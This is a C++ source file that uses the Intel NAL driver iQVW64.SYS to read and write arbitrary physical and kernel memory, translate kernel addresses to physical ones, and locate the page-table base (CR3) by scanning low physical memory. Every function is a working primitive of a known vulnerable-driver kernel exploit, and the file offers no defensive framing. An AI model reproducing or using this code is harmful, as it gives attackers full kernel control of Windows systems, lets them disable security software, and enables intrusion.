// ioctl.cpp -- iQVW64.SYS (Intel NAL) physmem implementation.

#include "ioctl.h"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <vector>

namespace ioctl {

bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
    uint8_t* out = static_cast<uint8_t*>(dst);
    while (size) {
        uint64_t page_base   = phys & ~0xFFFULL;
        uint32_t page_offset = static_cast<uint32_t>(phys & 0xFFF);
        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000 - page_offset));
        DWORD returned = 0;

        NalMapInput map{};
        map.case_number = NAL_CASE_MAP;
        map.buffer_size = 0x20;
        map.phys_address = page_base;
        map.map_size = 0x1000;

        if (!DeviceIoControl(device, IOCTL_NAL,
                             &map, sizeof(map), nullptr, 0,
                             &returned, nullptr) || map.mapped_va == 0) {
            std::printf("[!] ioctl::read_physical MAP failed (phys=%016llX size=%u err=%lu mapped_va=%016llX)\n",
                        static_cast<unsigned long long>(phys), chunk, GetLastError(),
                        static_cast<unsigned long long>(map.mapped_va));
            return false;
        }

        NalCopyInput copy{};
        copy.case_number = NAL_CASE_COPY;
        copy.buffer_size = 0x18;
        copy.source = map.mapped_va + page_offset;
        copy.destination = reinterpret_cast<uint64_t>(out);
        copy.length = chunk;

        bool copy_ok = DeviceIoControl(device, IOCTL_NAL,
                                       &copy, sizeof(copy), nullptr, 0,
                                       &returned, nullptr);
        if (!copy_ok) {
            std::printf("[!] ioctl::read_physical COPY failed (va=%016llX size=%u err=%lu)\n",
                        static_cast<unsigned long long>(map.mapped_va + page_offset), chunk, GetLastError());
        }

        NalMapInput unmap{};
        unmap.case_number = NAL_CASE_UNMAP;
        unmap.buffer_size = 0x20;
        unmap.mapped_va = map.mapped_va;
        unmap.phys_address = 0x1000;
        unmap.map_size = 0x1000;

        DeviceIoControl(device, IOCTL_NAL,
                        &unmap, sizeof(unmap), nullptr, 0,
                        &returned, nullptr);

        if (!copy_ok) return false;

        phys += chunk;
        out  += chunk;
        size -= chunk;
    }
    return true;
}

bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        uint64_t page_base   = phys & ~0xFFFULL;
        uint32_t page_offset = static_cast<uint32_t>(phys & 0xFFF);
        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000 - page_offset));
        DWORD returned = 0;

        NalMapInput map{};
        map.case_number = NAL_CASE_MAP;
        map.buffer_size = 0x20;
        map.phys_address = page_base;
        map.map_size = 0x1000;

        if (!DeviceIoControl(device, IOCTL_NAL,
                             &map, sizeof(map), nullptr, 0,
                             &returned, nullptr) || map.mapped_va == 0) {
            std::printf("[!] ioctl::write_physical MAP failed (phys=%016llX size=%u err=%lu mapped_va=%016llX)\n",
                        static_cast<unsigned long long>(phys), chunk, GetLastError(),
                        static_cast<unsigned long long>(map.mapped_va));
            return false;
        }

        NalCopyInput copy{};
        copy.case_number = NAL_CASE_COPY;
        copy.buffer_size = 0x18;
        copy.source = reinterpret_cast<uint64_t>(in);
        copy.destination = map.mapped_va + page_offset;
        copy.length = chunk;

        bool copy_ok = DeviceIoControl(device, IOCTL_NAL,
                                       &copy, sizeof(copy), nullptr, 0,
                                       &returned, nullptr);
        if (!copy_ok) {
            std::printf("[!] ioctl::write_physical COPY failed (va=%016llX size=%u err=%lu)\n",
                        static_cast<unsigned long long>(map.mapped_va + page_offset), chunk, GetLastError());
        }

        NalMapInput unmap{};
        unmap.case_number = NAL_CASE_UNMAP;
        unmap.buffer_size = 0x20;
        unmap.mapped_va = map.mapped_va;
        unmap.phys_address = 0x1000;
        unmap.map_size = 0x1000;

        DeviceIoControl(device, IOCTL_NAL,
                        &unmap, sizeof(unmap), nullptr, 0,
                        &returned, nullptr);

        if (!copy_ok) return false;

        phys += chunk;
        in   += chunk;
        size -= chunk;
    }
    return true;
}

bool read_kernel_virtual(HANDLE device, uint64_t kernel_va, void* dst, size_t size) {
    uint8_t* out = static_cast<uint8_t*>(dst);
    while (size) {
        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));
        DWORD returned = 0;

        NalCopyInput copy{};
        copy.case_number = NAL_CASE_COPY;
        copy.buffer_size = 0x18;
        copy.source = kernel_va;
        copy.destination = reinterpret_cast<uint64_t>(out);
        copy.length = chunk;

        if (!DeviceIoControl(device, IOCTL_NAL,
                             &copy, sizeof(copy), nullptr, 0,
                             &returned, nullptr)) {
            std::printf("[!] ioctl::read_kernel_virtual COPY failed (va=%016llX size=%u err=%lu)\n",
                        static_cast<unsigned long long>(kernel_va), chunk, GetLastError());
            return false;
        }

        kernel_va += chunk;
        out += chunk;
        size -= chunk;
    }
    return true;
}

bool write_kernel_virtual(HANDLE device, uint64_t kernel_va, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));
        DWORD returned = 0;

        NalCopyInput copy{};
        copy.case_number = NAL_CASE_COPY;
        copy.buffer_size = 0x18;
        copy.source = reinterpret_cast<uint64_t>(in);
        copy.destination = kernel_va;
        copy.length = chunk;

        if (!DeviceIoControl(device, IOCTL_NAL,
                             &copy, sizeof(copy), nullptr, 0,
                             &returned, nullptr)) {
            std::printf("[!] ioctl::write_kernel_virtual COPY failed (va=%016llX size=%u err=%lu)\n",
                        static_cast<unsigned long long>(kernel_va), chunk, GetLastError());
            return false;
        }

        kernel_va += chunk;
        in += chunk;
        size -= chunk;
    }
    return true;
}

bool virt_to_phys(HANDLE device, uint64_t kernel_va, uint64_t& phys) {
    NalVtopInput req{};
    req.case_number = NAL_CASE_VTOP;
    req.buffer_size = 0x10;
    req.virt_addr = kernel_va;

    DWORD returned = 0;
    if (!DeviceIoControl(device, IOCTL_NAL,
                         &req, sizeof(req), nullptr, 0,
                         &returned, nullptr)) {
        std::printf("[!] ioctl::virt_to_phys failed (va=%016llX err=%lu)\n",
                    static_cast<unsigned long long>(kernel_va), GetLastError());
        return false;
    }

    phys = req.out_phys;
    if (phys == 0) {
        std::printf("[!] ioctl::virt_to_phys returned 0 (va=%016llX)\n",
                    static_cast<unsigned long long>(kernel_va));
        return false;
    }
    return true;
}

bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
    std::vector<uint8_t> mem(0x100000, 0);
    if (!read_physical(device, 0x1000, mem.data() + 0x1000, 0x100000 - 0x1000)) {
        std::printf("[!] ioctl::get_pml4_phys: read of low 1MB failed\n");
        return false;
    }

    cr3 = 0;
    for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000) {
        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem.data() + off);
        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 112);
        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 160);

        if ((sig0   & 0xFFFFFFFFFFFF00FFULL) == 0x00000001000600E9ULL &&
            (ptr112 & 0xFFFFF80000000003ULL) == 0xFFFFF80000000000ULL &&
            (val160 & 0xFFFFFF0000000FFFULL) == 0) {
            cr3 = val160;
            break;
        }
    }

    if (cr3 == 0) {
        std::printf("[!] ioctl::get_pml4_phys: CR3 scan found no matching page in low 1 MB\n");
        return false;
    }
    return true;
}

} // namespace ioctl
